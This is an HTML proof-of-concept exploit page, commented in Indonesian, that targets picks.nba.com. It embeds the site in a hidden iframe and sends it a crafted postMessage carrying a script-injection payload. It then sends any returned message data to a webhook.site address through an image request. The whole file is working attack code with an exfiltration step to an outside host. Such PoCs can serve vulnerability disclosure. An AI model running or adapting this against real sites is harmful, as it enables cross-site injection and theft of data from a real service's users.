<!DOCTYPE html>
<html>
  <head>
    <title>NBA Picks Exploit PoC</title>
    <meta charset="UTF-8" />
  </head>
  <body>
    <h1>NBA Picks Exploit PoC</h1>

    <script>
      // Buat iframe tersembunyi ke picks.nba.com
      const iframe = document.createElement("iframe");
      iframe.style.display = "none";
      iframe.src = "https://picks.nba.com/";
      document.body.appendChild(iframe);

      // Payload: Bridge message untuk trigger emitter internal
      const craftedPayload = JSON.stringify({
        bridgeId: "exploitBridge",        // bridgeId agar diterima oleh 'un()'
        action: "onUILoaded",             // bisa diganti sesuai fungsionalitas target
        payload: {
          injected: true,
          data: "<script>alert('Exploit!')</script>"
        }
      });

      // Kirim payload setelah iframe dimuat
      iframe.onload = function () {
        console.log("[*] Iframe loaded, sending malicious postMessage...");

        iframe.contentWindow.postMessage(craftedPayload, "*");
      };

      // Dengarkan respon dari target jika ada
      window.addEventListener("message", function (event) {
        // Log respon untuk debugging
        console.log("[+] Received message from iframe:", event.data);

        // Kirim data ke webhook.site menggunakan teknik image loading agar bebas CORS
        const img = new Image();
        img.src =
          "https://webhook.site/357a3362-1db3-4f0f-acf7-bca1f697ca37?data=" +
          encodeURIComponent(JSON.stringify(event.data));
        document.body.appendChild(img);
      });
    </script>
  </body>
</html>
